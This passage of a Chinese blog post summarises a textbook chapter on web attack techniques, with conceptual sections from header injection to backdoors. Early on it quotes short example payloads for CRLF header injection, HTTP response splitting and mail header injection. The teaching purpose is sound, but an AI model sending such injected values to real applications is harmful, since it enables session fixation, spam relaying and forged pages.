+<p><img src="/images/2018-09-18-read-图解HTTP-Part11-HTTP 首部注入攻击示例.png" alt="HTTP 首部注入攻击示例"></p>
+<p>攻击者以下面的内容替代之前的类别 ID 后发送请求。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">101%0D%0ASet-Cookie:+SID=123456789</span><br></pre></td></tr></table></figure>
+<p>其中，<code>%0D%0A</code> 代表 HTTP 报文中的换行符，紧接着的是可强制将攻击者网站（<a href="http://hackr.jp/）的会话">http://hackr.jp/）的会话</a> ID 设置成 SID=123456789 的 Set-Cookie 首部字段。</p>
+<p>发送该请求之后，假设结果返回以下响应。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Location</span>: http://example.com/?cat=101（%0D%0A ：换行符）</span><br><span class="line"><span class="attribute">Set-Cookie</span>: SID=123456789</span><br></pre></td></tr></table></figure>
+<p>此刻，首部字段 Set-Cookie 已生效，因此攻击者可指定修改任意的 Cookie 信息。通过和会话固定攻击（攻击者可使用指定的会话 ID）攻击组合，攻击者可伪装成用户。</p>
+<p>攻击者输入的 <code>%0D%0A</code>，原本应该属于首部字段 Location 的查询值部分，但经过解析后，<code>%0D%0A</code> 变成了换行符，结果插入了新的首部字段。<br>这样一来，攻击者可在响应中插入任意的首部字段。</p>
+<p>HTTP 响应截断攻击</p>
+<p>HTTP 响应截断攻击是用在 HTTP 首部注入的一种攻击。攻击顺序相同，但是要将两个 <code>%0D%0A%0D%0A</code> 并排插入字符串后发送。利用这两个连续的换行就可作出 HTTP 首部与主体分隔所需的空行了，这样就能显示伪造的主体，达到攻击目的。这样的攻击叫做 HTTP 响应截断攻击。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%0D%0A%0D%0A&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;之后，想要显示的网页内容 &lt;!--（原来页面对应的首部字段) --&gt;</span><br></pre></td></tr></table></figure>
+<p>在可能进行 HTTP 首部注入的环节，通过发送上面的字符串，返回结果得到以下这种响应。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Set-Cookie</span>: UID=（%0D%0A ：换行符）</span><br><span class="line">（%0D%0A ：换行符）</span><br><span class="line">&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;之后，想要显示的网页内容 &lt;!--（原来页面对应的首部字段)--&gt;</span><br></pre></td></tr></table></figure>
+<p>利用这个攻击，已触发陷阱的用户浏览器会显示伪造的 Web 页面，再让用户输入自己的个人信息等，可达到和跨站脚本攻击相同的效果。</p>
+<p>另外，滥用 HTTP/1.1 中汇集多响应返回功能，会导致缓存服务器对任意内容进行缓存操作。这种攻击称为缓存污染。使用该缓存服务器的用户，在浏览遭受攻击的网站时，会不断地浏览被替换掉的 Web 网页。</p>
+<h4 id="邮件首部注入攻击"><a href="#邮件首部注入攻击" class="headerlink" title="邮件首部注入攻击"></a>邮件首部注入攻击</h4><p>邮件首部注入（Mail Header Injection）是指 Web 应用中的邮件发送功能，攻击者通过向邮件首部 To 或 Subject 内任意添加非法内容发起的攻击。利用存在安全漏洞的 Web 网站，可对任意邮件地址发送广告邮件或病毒邮件。</p>
+<p><img src="/images/2018-09-18-read-图解HTTP-Part11-邮件首部注入攻击案例.png" alt="邮件首部注入攻击案例"></p>
+<p>攻击者将以下数据作为邮件地址发起请求。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">bob@hackr.jp%0D%0ABcc</span>: user@example.com</span><br></pre></td></tr></table></figure>
+<p><code>%0D%0A</code> 在邮件报文中代表换行符。一旦咨询表单所在的 Web应用接收了这个换行符，就可能实现对 Bcc 邮件地址的追加发送，而这原本是无法指定的。<br>另外像下面一样，使用两个连续的换行符就有可能篡改邮件文本内容并发送。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bob@hackr.jp%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">0</span>D%<span class="number">0</span>ATest Message</span><br></pre></td></tr></table></figure>
+<p>再以相同的方法，就有可能改写 To 和 Subject 等任意邮件首部，或向文本添加附件等动作。</p>
+<h4 id="目录遍历攻击"><a href="#目录遍历攻击" class="headerlink" title="目录遍历攻击"></a>目录遍历攻击</h4><p>目录遍历（Directory Traversal）攻击是指对本无意公开的文件目录，通过非法截断其目录路径后，达成访问目的的一种攻击。这种攻击有时也称为路径遍历（Path Traversal）攻击。</p>
+<p>通过 Web 应用对文件处理操作时，在由外部指定文件名的处理存在疏漏的情况下，用户可使用 …/ 等相对路径定位到 /etc/passed 等绝对路径上，因此服务器上任意的文件或文件目录皆有可能被访问到。这样一来，就有可能非法浏览、篡改或删除 Web 服务器上的文件。</p>
+<h4 id="远程文件包含漏洞"><a href="#远程文件包含漏洞" class="headerlink" title="远程文件包含漏洞"></a>远程文件包含漏洞</h4><p>远程文件包含漏洞（Remote File Inclusion）是指当部分脚本内容需要从其他文件读入时，攻击者利用指定外部服务器的 URL 充当依赖文件，让脚本读取之后，就可运行任意脚本的一种攻击。</p>
+<p>这主要是 PHP 存在的安全漏洞，对 PHP 的 include 或 require 来说，这是一种可通过设定，指定外部服务器的 URL 作为文件名的功能。但是，该功能太危险，PHP5.2.0 之后默认设定此功能无效。<br>固然存在输出值转义的问题，但更应控制对任意文件名的指定。</p>
+<h3 id="因设置或设计上的缺陷引发的安全漏"><a href="#因设置或设计上的缺陷引发的安全漏" class="headerlink" title="因设置或设计上的缺陷引发的安全漏"></a>因设置或设计上的缺陷引发的安全漏</h3><p>因设置或设计上的缺陷引发的安全漏洞是指，错误设置 Web 服务器，或是由设计上的一些问题引起的安全漏洞。</p>
+<h4 id="强制浏览"><a href="#强制浏览" class="headerlink" title="强制浏览"></a>强制浏览</h4><p>强制浏览（Forced Browsing）安全漏洞是指，从安置在 Web 服务器的公开目录下的文件中，浏览那些原本非自愿公开的文件。</p>
+<p>强制浏览有可能会造成以下一些影响。</p>
+<ul>
+<li>泄露顾客的个人信息等重要情报</li>
+<li>泄露原本需要具有访问权限的用户才可查阅的信息内容</li>
+<li>泄露未外连到外界的文件</li>
+</ul>
+<p>对那些原本不愿公开的文件，为了保证安全会隐蔽其 URL。可一旦知道了那些 URL，也就意味着可浏览 URL 对应的文件。直接显示容易推测的文件名或文件目录索引时，通过某些方法可能会使 URL 产生泄露。</p>
+<h4 id="不正确的错误消息处理"><a href="#不正确的错误消息处理" class="headerlink" title="不正确的错误消息处理"></a>不正确的错误消息处理</h4><p>不正确的错误消息处理（Error Handling Vulnerability）的安全漏洞是指，Web 应用的错误信息内包含对攻击者有用的信息。与 Web 应用有关的主要错误信息如下所示。</p>
+<ul>
+<li>Web 应用抛出的错误消息</li>
+<li>数据库等系统抛出的错误消息</li>
+</ul>
+<p>Web 应用不必在用户的浏览画面上展现详细的错误消息。对攻击者来说，详细的错误消息有可能给他们下一次攻击以提示。</p>
+<h4 id="开放重定向"><a href="#开放重定向" class="headerlink" title="开放重定向"></a>开放重定向</h4><p>开放重定向（Open Redirect）是一种对指定的任意 URL 作重定向跳转的功能。而于此功能相关联的安全漏洞是指，假如指定的重定向 URL到某个具有恶意的 Web 网站，那么用户就会被诱导至那个 Web 网站。</p>
+<h3 id="因会话管理疏忽引发的安全漏洞"><a href="#因会话管理疏忽引发的安全漏洞" class="headerlink" title="因会话管理疏忽引发的安全漏洞"></a>因会话管理疏忽引发的安全漏洞</h3><p>会话管理是用来管理用户状态的必备功能，但是如果在会话管理上有所疏忽，就会导致用户的认证状态被窃取等后果。</p>
+<h4 id="会话劫持"><a href="#会话劫持" class="headerlink" title="会话劫持"></a>会话劫持</h4><p>会话劫持（Session Hijack）是指攻击者通过某种手段拿到了用户的会话 ID，并非法使用此会话 ID 伪装成用户，达到攻击的目的。</p>
+<p><img src="/images/2018-09-18-read-图解HTTP-Part11-会话劫持.png" alt="会话劫持"></p>
+<p>具备认证功能的 Web 应用，使用会话 ID 的会话管理机制，作为管理认证状态的主流方式。会话 ID 中记录客户端的 Cookie 等信息，服务器端将会话 ID 与认证状态进行一对一匹配管理。</p>
+<p>下面列举了几种攻击者可获得会话 ID 的途径。</p>
+<ul>
+<li>通过非正规的生成方法推测会话 ID</li>
+<li>通过窃听或 XSS 攻击盗取会话 ID</li>
+<li>通过会话固定攻击（Session Fixation）强行获取会话 ID</li>
+</ul>
+<p>会话劫持攻击案例</p>
+<p>下面我们以认证功能为例讲解会话劫持。这里的认证功能通过会话管理机制，会将成功认证的用户的会话 ID（SID）保存在用户浏览器的 Cookie 中。</p>
+<p>攻击者在得知该 Web 网站存在可跨站攻击（XSS）的安全漏洞后，就设置好用 JavaScript 脚本调用 document.cookie 以窃取Cookie 信息的陷阱，一旦用户踏入陷阱（访问了该脚本），攻击者就能获取含有会话 ID 的 Cookie。<br>攻击者拿到用户的会话 ID 后，往自己的浏览器的 Cookie 中设置该会话 ID，即可伪装成会话 ID 遭窃的用户，访问 Web 网站了。</p>
+<h4 id="会话固定攻击"><a href="#会话固定攻击" class="headerlink" title="会话固定攻击"></a>会话固定攻击</h4><p>对以窃取目标会话 ID 为主动攻击手段的会话劫持而言，会话固定攻击（Session Fixation）攻击会强制用户使用攻击者指定的会话 ID，属于被动攻击。</p>
+<p><img src="/images/2018-09-18-read-图解HTTP-Part11-会话固定攻击案例.png" alt="会话固定攻击案例"></p>
+<h4 id="跨站点请求伪造"><a href="#跨站点请求伪造" class="headerlink" title="跨站点请求伪造"></a>跨站点请求伪造</h4><p>跨站点请求伪造（Cross-Site Request Forgeries，CSRF）攻击是指攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态更新，属于被动攻击。</p>
+<p>跨站点请求伪造有可能会造成以下等影响。</p>
+<ul>
+<li>利用已通过认证的用户权限更新设定信息等</li>
+<li>利用已通过认证的用户权限购买商品</li>
+<li>利用已通过认证的用户权限在留言板上发表言论</li>
+</ul>
+<p><img src="/images/2018-09-18-read-图解HTTP-Part11-跨站点请求伪造的攻击案例.png" alt="跨站点请求伪造的攻击案例"></p>
+<h3 id="其他安全漏洞"><a href="#其他安全漏洞" class="headerlink" title="其他安全漏洞"></a>其他安全漏洞</h3><p>密码破解攻击（Password Cracking）即算出密码，突破认证。攻击不仅限于 Web 应用，还包括其他的系统（如 FTP 或 SSH 等），本节将会讲解对具备认证功能的 Web 应用进行的密码破解。</p>
+<p>密码破解有以下两种手段。</p>
+<ul>
+<li>通过网络的密码试错</li>
+<li>对已加密密码的破解（指攻击者入侵系统，已获得加密或散列处理的密码数据的情况）</li>
+</ul>
+<p>除去突破认证的攻击手段，还有 SQL 注入攻击逃避认证，跨站脚本攻击窃取密码信息等方法。</p>
+<h4 id="通过网络进行密码试错"><a href="#通过网络进行密码试错" class="headerlink" title="通过网络进行密码试错"></a>通过网络进行密码试错</h4><p>对 Web 应用提供的认证功能，通过网络尝试候选密码进行的一<br>种攻击。主要有以下两种方式。</p>
+<ul>
+<li>穷举法</li>
+<li>字典攻击</li>
+</ul>
+<h5 id="穷举法"><a href="#穷举法" class="headerlink" title="穷举法"></a>穷举法</h5><p>穷举法（Brute-force Attack，又称暴力破解法）是指对所有密钥集合构成的密钥空间（Keyspace）进行穷举。即，用所有可行的候选密码对目标的密码系统试错，用以突破验证的一种攻击。</p>
+<p>比如银行采用的个人识别码是由“4 位数字”组成的密码，那么就要从 0000~9999 中的全部数字逐个进行尝试。这样一来，必定在候选的密码集合中存在一个正确的密码，可通过认证。</p>
+<p>因为穷举法会尝试所有的候选密码，所以是一种必然能够破解密码的攻击。但是，当密钥空间很庞大时，解密可能需要花费数年，甚至千年的时间，因此从现实角度考量，攻击是失败的。</p>
+<h5 id="字典攻击"><a href="#字典攻击" class="headerlink" title="字典攻击"></a>字典攻击</h5><p>字典攻击是指利用事先收集好的候选密码（经过各种组合方式后存入字典），枚举字典中的密码，尝试通过认证的一种攻击手法。</p>
+<p>与穷举法相比，由于需要尝试的候选密码较少，意味着攻击耗费的时间比较短。但是，如果字典中没有正确的密码，那就无法破解成功。因此攻击的成败取决于字典的内容。</p>
+<h4 id="对已加密密码的破解"><a href="#对已加密密码的破解" class="headerlink" title="对已加密密码的破解"></a>对已加密密码的破解</h4><p>Web 应用在保存密码时，一般不会直接以明文的方式保存，通过散列函数做散列处理或加 salt 的手段对要保存的密码本身加密。那即使攻击者使用某些手段窃取密码数据，如果想要真正使用这些密码，则必须先通过解码等手段，把加密处理的密码还原成明文形式。</p>
+<p>从加密过的数据中导出明文通常有以下几种方法。</p>
+<ul>
+<li>通过穷举法·字典攻击进行类推</li>
+<li>彩虹表</li>
+<li>拿到密钥</li>
+<li>加密算法的漏洞</li>
+</ul>
+<h5 id="通过穷举法·字典攻击进行类推"><a href="#通过穷举法·字典攻击进行类推" class="headerlink" title="通过穷举法·字典攻击进行类推"></a>通过穷举法·字典攻击进行类推</h5><p>针对密码使用散列函数进行加密处理的情况，采用和穷举法或字典攻击相同的手法，尝试调用相同的散列函数加密候选密码，然后把计算出的散列值与目标散列值匹配，类推出密码。</p>
+<p><img src="/images/2018-09-18-read-图解HTTP-Part11-穷举法·字典攻击进行类推.png" alt="破解已加密的密码 / 通过穷举法·字典攻击进行类推"></p>
+<h5 id="彩虹表"><a href="#彩虹表" class="headerlink" title="彩虹表"></a>彩虹表</h5><p>彩虹表（Rainbow Table）是由明文密码及与之对应的散列值构成的一张数据库表，是一种通过事先制作庞大的彩虹表，可在穷举法 • 字典攻击等实际破解过程中缩短消耗时间的技巧。从彩虹表内搜索散列值就可以推导出对应的明文密码。</p>
+<p><img src="/images/2018-09-18-read-图解HTTP-Part11-彩虹表.png" alt="彩虹表"></p>
+<p>为了提高攻击成功率，拥有一张海量数据的彩虹表就成了必不可少的条件。例如在 Free Rainbow Tables 网站上（<a href="http://www.freerainbowtables.com/en/tables2/）公布的一张由大小写字母及数字全排列的">http://www.freerainbowtables.com/en/tables2/）公布的一张由大小写字母及数字全排列的</a> 1~8 位字符串对应的 MD5 散列值构成的彩虹表，其大小约为 1050 吉字节。</p>
+<h5 id="拿到密钥"><a href="#拿到密钥" class="headerlink" title="拿到密钥"></a>拿到密钥</h5><p>使用共享密钥加密方式对密码数据进行加密处理的情况下，如果能通过某种手段拿到加密使用的密钥，也就可以对密码数据解密了。</p>
+<h5 id="加密算法的漏洞"><a href="#加密算法的漏洞" class="headerlink" title="加密算法的漏洞"></a>加密算法的漏洞</h5><p>考虑到加密算法本身可能存在的漏洞，利用该漏洞尝试解密也是一种可行的方法。但是要找到那些已广泛使用的加密算法的漏洞，又谈何容易，因此困难极大，不易成功。</p>
+<p>而 Web 应用开发者独立实现的加密算法，想必尚未经过充分的验证，还是很有可能存在漏洞的。</p>
+<h4 id="点击劫持"><a href="#点击劫持" class="headerlink" title="点击劫持"></a>点击劫持</h4><p>点击劫持（Clickjacking）是指利用透明的按钮或链接做成陷阱，覆盖在 Web 页面之上。然后诱使用户在不知情的情况下，点击那个链接访问内容的一种攻击手段。这种行为又称为界面伪装（UI Redressing）。</p>
+<p>已设置陷阱的 Web 页面，表面上内容并无不妥，但早已埋入想让用户点击的链接。当用户点击到透明的按钮时，实际上是点击了已指定透明属性元素的 iframe 页面。</p>
+<h4 id="DoS-攻击"><a href="#DoS-攻击" class="headerlink" title="DoS 攻击"></a>DoS 攻击</h4><p>DoS 攻击（Denial of Service attack）是一种让运行中的服务呈停止状态的攻击。有时也叫做服务停止攻击或拒绝服务攻击。DoS 攻击的对象不仅限于 Web 网站，还包括网络设备及服务器等。</p>
+<p>主要有以下两种 DoS 攻击方式。</p>
+<ul>
+<li>集中利用访问请求造成资源过载，资源用尽的同时，实际上服务也就呈停止状态。</li>
+<li>通过攻击安全漏洞使服务停止。</li>
+</ul>
+<p>其中，集中利用访问请求的 DoS 攻击，单纯来讲就是发送大量的合法请求。服务器很难分辨何为正常请求，何为攻击请求，因此很难防止 DoS 攻击。</p>
+<p><img src="/images/2018-09-18-read-图解HTTP-Part11-DoS 攻击.png" alt="DoS 攻击"></p>
+<p>多台计算机发起的 DoS 攻击称为 DDoS 攻击（Distributed Denial of Service attack）。DDoS 攻击通常利用那些感染病毒的计算机作为攻击者的攻击跳板。</p>
+<h4 id="后门程序"><a href="#后门程序" class="headerlink" title="后门程序"></a>后门程序</h4><p>后门程序（Backdoor）是指开发设置的隐藏入口，可不按正常步骤使用受限功能。利用后门程序就能够使用原本受限制的功能。</p>
+<ul>
+<li>开发阶段作为 Debug 调用的后门程序</li>
+<li>开发者为了自身利益植入的后门程序</li>
+<li>攻击者通过某种方法设置的后门程序</li>
+</ul>
+<p>可通过监视进程和通信的状态发现被植入的后门程序。但设定在 Web应用中的后门程序，由于和正常使用时区别不大，通常很难发现。</p>
+<p>参考链接：<a href="https://book.douban.com/subject/25863515/">https://book.douban.com/subject/25863515/</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    赖彬鸿
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://laibh.top/2018-09-18-read-图解HTTP-Part11.html" title="深入浅出HTTP，从开始到放弃（第十一章）—— Web 的攻击技术">http://laibh.top/2018-09-18-read-图解HTTP-Part11.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/http/" <i class="fa fa-tag"></i> http</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018-09-18-read-图解HTTP-Part10.html" rel="next" title="深入浅出HTTP，从开始到放弃（第十章）—— 构建 Web 内容的技术">
+                <i class="fa fa-chevron-left"></i> 深入浅出HTTP，从开始到放弃（第十章）—— 构建 Web 内容的技术
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018-09-20-NodeJs-Part4.html" rel="prev" title="好玩的Nodejs —— Node.js核心模块">
+                好玩的Nodejs —— Node.js核心模块 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        
+  <script>
+    window._bd_share_config = {
+      "common": {
+        "bdText": "",
+        "bdMini": "1",
+        "bdMiniList": false,
+        "bdPic": ""
+      },
+      "image": {
+        "viewList": ["tsina", "douban", "sqq", "qzone", "weixin", "twi", "fbook"],
+        "viewText": "分享到：",
+        "viewSize": "16"
+      },
+      "slide": {
+        "bdImg": "5",
+        "bdPos": "left",
+        "bdTop": "100"
+      }
+    }
+  </script>
+
+<script>
+  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/static/api/js/share.js?v=89860593.js?'+~(-new Date()/36e5)];;
+</script>
+
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8zOTcwMy8xNjIzMA"></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/myPhoto.jpg"
+                alt="赖彬鸿" />
+            
+              <p class="site-author-name" itemprop="name">赖彬鸿</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">135</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">32</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">40</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/LbhFront-end" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.cnblogs.com/lbh2018/" target="_blank" title="博客园">
+                      
+                        <i class="fa fa-fw fa-globe"></i>博客园</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://yq.aliyun.com/users/1802204154913774?spm=a2c4e.11153940.blogcont662526.4.6c0a34f6E2lR5o" target="_blank" title="云栖">
+                      
+                        <i class="fa fa-fw fa-globe"></i>云栖</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:544289495@qq.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="tencent://AddContact/?fromId=45&fromSubId=1&subcmd=all&uin=544289495&website=www.oicqzone.com" target="_blank" title="QQ">
+                      
+                        <i class="fa fa-fw fa-qq"></i>QQ</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.google.com.hk/search?safe=strict&source=hp&ei=JtLCXIriJ8G4-gS_-4qABQ&q=site%3Alaibh.top&btnK=Google+%E6%90%9C%E7%B4%A2&oq=site%3Alaibh.top&gs_l=psy-ab.3...1158.6834..7051...5.0..1.246.3720.2-17......0....1..gws-wiz.....0..0j0i10.rJMUHvdrbds" target="_blank" title="Google">
+                      
+                        <i class="fa fa-fw fa-google"></i>Google</a>
+                  </span>
+                
+            </div>
+          
+         <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=90  src="//music.163.com/outchain/player?type=0&id=2353471182&auto=0&height=90"></iframe>
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.chjtx.com/JRoll/" title="醉萝卜" target="_blank">醉萝卜</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://hzd.plus/" title="Zhendong" target="_blank">Zhendong</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.cnblogs.com/cnyball" title="cnyballk" target="_blank">cnyballk</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://johnzz.top/" title="John" target="_blank">John</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://xiaojun1994.top/" title="xiaojun1994" target="_blank">xiaojun1994</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://me.ursb.me" title="Airing" target="_blank">Airing</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.iyouhun.com" title="游魂" target="_blank">游魂</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://icoty.github.io/" title="荒野之萍" target="_blank">荒野之萍</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://im-one.github.io/" title="imOne" target="_blank">imOne</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://blog.hourxu.com/" title="Ambre" target="_blank">Ambre</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.huyujs.com" title="胡雨" target="_blank">胡雨</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.andou.live" title="安逗" target="_blank">安逗</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.jianshu.com/u/701a8bbf4f7e" title="陈健斌" target="_blank">陈健斌</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://itobys.github.io/" title="汤姆Tom酱" target="_blank">汤姆Tom酱</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://breeze2.github.io/blog/" title="林毅锋" target="_blank">林毅锋</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.qzroc.com/" title="大鹏博客" target="_blank">大鹏博客</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://lyreal666.com/" title="余腾靖的博客" target="_blank">余腾靖的博客</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://buzuosheng.com/" title="不作声" target="_blank">不作声</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.baidu.com/s?ie=UTF-8&wd=site%3Alaibh.top" title="百度" target="_blank">百度</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.google.com.hk/search?safe=strict&source=hp&ei=zXdWXfemLJbO0PEP8qyXyA0&q=site%3Alaibh.top&oq=site%3Alaibh.top&gs_l=psy-ab.3...580.8501..8767...0.0..0.397.934.2-1j2......0....2j1..gws-wiz.QESXfWGadT0&ved=0ahUKEwi3wbusiofkAhUWJzQIHXLWBdkQ4dUDCAU&uact=5" title="谷歌" target="_blank">谷歌</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#第十一章-Web-的攻击技术"><span class="nav-number">1.</span> <span class="nav-text">第十一章  Web 的攻击技术</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#针对-Web-的攻击技术"><span class="nav-number">1.1.</span> <span class="nav-text">针对 Web 的攻击技术</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#HTTP-不具备必要的安全功能"><span class="nav-number">1.1.1.</span> <span class="nav-text">HTTP 不具备必要的安全功能</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#在客户端即可篡改请求"><span class="nav-number">1.1.2.</span> <span class="nav-text">在客户端即可篡改请求</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#针对-Web-应用的攻击模式"><span class="nav-number">1.1.3.</span> <span class="nav-text">针对 Web 应用的攻击模式</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#因输出值转义不完全引发的安全漏洞"><span class="nav-number">1.2.</span> <span class="nav-text">因输出值转义不完全引发的安全漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#跨站脚本攻击"><span class="nav-number">1.2.1.</span> <span class="nav-text">跨站脚本攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL-注入攻击"><span class="nav-number">1.2.2.</span> <span class="nav-text">SQL 注入攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#OS-命令注入攻击"><span class="nav-number">1.2.3.</span> <span class="nav-text">OS 命令注入攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#HTTP-首部注入攻击"><span class="nav-number">1.2.4.</span> <span class="nav-text">HTTP 首部注入攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#邮件首部注入攻击"><span class="nav-number">1.2.5.</span> <span class="nav-text">邮件首部注入攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#目录遍历攻击"><span class="nav-number">1.2.6.</span> <span class="nav-text">目录遍历攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#远程文件包含漏洞"><span class="nav-number">1.2.7.</span> <span class="nav-text">远程文件包含漏洞</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#因设置或设计上的缺陷引发的安全漏"><span class="nav-number">1.3.</span> <span class="nav-text">因设置或设计上的缺陷引发的安全漏</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" 